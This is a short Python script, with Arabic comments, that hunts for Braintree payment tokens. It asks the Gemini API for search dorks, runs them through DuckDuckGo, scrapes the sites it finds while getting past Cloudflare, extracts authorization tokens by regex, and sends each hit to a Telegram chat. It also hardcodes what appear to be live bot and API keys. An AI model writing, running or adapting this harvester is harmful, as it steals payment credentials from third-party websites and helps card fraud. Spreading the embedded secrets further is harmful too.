import telebot, cloudscraper, re, time, requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

# --- بياناتك الخاصة ---
TOKEN = "7925209531:AAF5e1jxZiGZB7bKyvLWxIdziGfjAR86blM"
CHAT_ID = "1296559148"
API_KEY = "AIzaSyBoQH1K30J5sh7S7ce77uZUcq33Di1qMfU"

bot = telebot.TeleBot(TOKEN)
scraper = cloudscraper.create_scraper(browser={'browser': 'chrome','platform': 'windows','desktop': True})

def hunt(url):
    try:
        r = scraper.get(url, timeout=15)
        if "braintree" in r.text.lower():
            token = re.findall(r'auth.*?["\']([a-zA-Z0-9_\-=.]+)["\']', r.text)
            msg = f"🛰️ [GITHUB HIT]\n🔗 `{url}`\n🔑 TOKEN: `{token[0] if token else 'Found'}`"
            bot.send_message(CHAT_ID, msg)
    except: pass

print("🚀 الوحش يستعد للصيد من GitHub...")

# جيت هاب أكشن بيشتغل لفترة محددة، فإحنا هنخليه يفحص كمية محددة كل مرة
try:
    res = requests.post(f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={API_KEY}", 
                         json={"contents": [{"parts": [{"text": "10 Braintree dorks. JSON: {'dorks':[]}"}]}]})
    dorks = re.findall(r'"(inurl:.*?)"', res.text)
    
    for dork in dorks:
        s = scraper.get(f"https://html.duckduckgo.com/html/?q={dork}", timeout=20)
        links = [a['href'] for a in BeautifulSoup(s.text, 'html.parser').find_all('a', href=True) if "http" in a['href']]
        with ThreadPoolExecutor(max_workers=5) as ex:
            ex.map(hunt, links)
except Exception as e:
    print(f"Error: {e}")
